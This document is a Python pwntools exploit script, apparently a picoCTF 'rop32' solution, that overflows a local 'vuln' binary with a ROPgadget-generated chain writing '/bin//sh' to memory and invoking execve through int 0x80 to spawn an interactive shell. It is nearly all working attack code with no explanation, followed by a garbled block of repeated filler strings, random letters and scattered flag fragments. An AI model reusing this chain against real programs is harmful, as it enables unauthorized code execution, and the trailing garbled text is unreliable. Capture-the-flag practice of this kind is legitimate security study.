#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack
from pwn import *

context.log_level = 'debug'

# sh = process("/problems/rop32_3_f3a10b5fa410146f5328fb7b3e63e7c0/vuln")
sh = process("./vuln")

# Padding goes here
p = 'A'*0x18 + 'B'*4

p += p32(0x0806ee6b) # pop edx ; ret
p += p32(0x080da060) # @ .data
p += p32(0x080a8e36) # pop eax ; ret
# p += '/bin'
p += p32(0x6e69622f)
p += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
p += p32(0x0806ee6b) # pop edx ; ret
p += p32(0x080da064) # @ .data + 4
p += p32(0x080a8e36) # pop eax ; ret
# p += '//sh'
p += p32(0x0068732f)
p += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
p += p32(0x0806ee6b) # pop edx ; ret
p += p32(0x080da068) # @ .data + 8
p += p32(0x08056420) # xor eax, eax ; ret
p += p32(0x08056e65) # mov dword ptr [edx], eax ; ret
p += p32(0x080481c9) # pop ebx ; ret
p += p32(0x080da060) # @ .data
p += p32(0x0806ee92) # pop ecx ; pop ebx ; ret
p += p32(0x080da068) # @ .data + 8
p += p32(0x080da060) # padding without overwrite ebx
p += p32(0x0806ee6b) # pop edx ; ret
p += p32(0x080da068) # @ .data + 8
p += p32(0x08056420) # xor eax, eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret
p += p32(0x0807c2fa) # inc eax ; ret

p += p32(0x080481b2)
p += p32(0x08049563) # int 0x80

p += p32(0x080481b2) # ret

sh.recv()
sh.sendline(p)
sh.interactive()


picoiafda6f6e 
kfdsalkfsalkico{N0t_a_fLag}
icoCTF{StaT31355e
fjdbanlkfdnfjdbanlkfdnfjdbanlkfdnfjdbanlkfdnfjdbanlkfdnfjdbanlkfdnfjdbanlkfdnfjdbanlkfdnfjdbanlkfdn
picoCTF Sure is fun!picoCTF Sure is fun!picoCTF Sure is fun!picoCTF Sure is fun!picoCTF Sure is fun!picoCTF Sure is fun!picoCTF Sure is fun!picoCTF Sure is fun!picoCTF Sure is fun!aaaaa
I really want to find some picoCTF flagsI really want to find some picoCTF flagsI really want to find some picoCTF flagsI really want to find some picoCTF flagsI really want to find some picoCTF flagsI really want to find some picoCTF flagsI really want to find some picoCTF flagsI really want to find some picoCTF flagsI really want to find some picoCTF flags
CTF
lankeflksanlkfdnfjdsakf
_36}

